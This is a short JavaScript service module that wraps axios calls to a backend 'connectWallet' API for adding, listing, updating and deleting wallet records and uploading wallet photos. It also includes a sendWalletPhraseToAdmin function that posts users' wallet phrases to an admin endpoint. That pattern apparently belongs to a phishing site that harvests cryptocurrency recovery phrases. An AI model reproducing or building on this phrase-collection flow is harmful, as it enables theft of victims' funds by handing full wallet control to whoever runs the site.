import axios from "axios";

const BACKEND_URL = import.meta.env.VITE_APP_BACKEND_URL;
export const API_URL = `${BACKEND_URL}/api/connectWallet/`;

//addConnectWallet
const  addConnectWallet = async (userData) => {
    const response = await axios.post(API_URL + "addConnectWallet", userData, {
      withCredentials: true,
    });
    return response.data;
  };

//getAllConnectWallet
const getAllConnectWallet = async () => {
    const response = await axios.get(API_URL + "getAllConnectWallet") 
    return response.data;
};

//updateConnectWallet
const updateConnectWallet = async (id, userData) => {
  const response = await axios.patch(API_URL + `updateConnectWallet/${id}`, userData);
  return response.data;
};

//deleteConnectWallet
const deleteConnectWallet = async (id, userData) => {
  const response = await axios.delete(API_URL + `deleteConnectWallet/${id}`, userData);
  return response.data;
};

// deleteArrayOfWallets
const deleteArrayOfWallets = async (walletIds) => {
  const response = await axios.delete(API_URL + `deleteArrayOfWallets`, {
    data: { walletIds }, // Ensure data is sent this way for DELETE requests
  });
  return response.data;
};

//updateConnectWalletPhoto
const updateConnectWalletPhoto = async (id, formData) => {
  const response = await axios.post(API_URL + `updateConnectWalletPhoto/${id}`, formData);
  return response.data;
};

//sendWalletPhraseToAdmin 
const sendWalletPhraseToAdmin = async (formData) => {
  const response = await axios.post(API_URL + "sendWalletPhraseToAdmin", formData) 
  return response.data.message;
};








const connectWalletService = {
    getAllConnectWallet,
    addConnectWallet,
    updateConnectWallet,
    deleteConnectWallet,
    deleteArrayOfWallets,
    updateConnectWalletPhoto,
    sendWalletPhraseToAdmin
}

export default connectWalletService;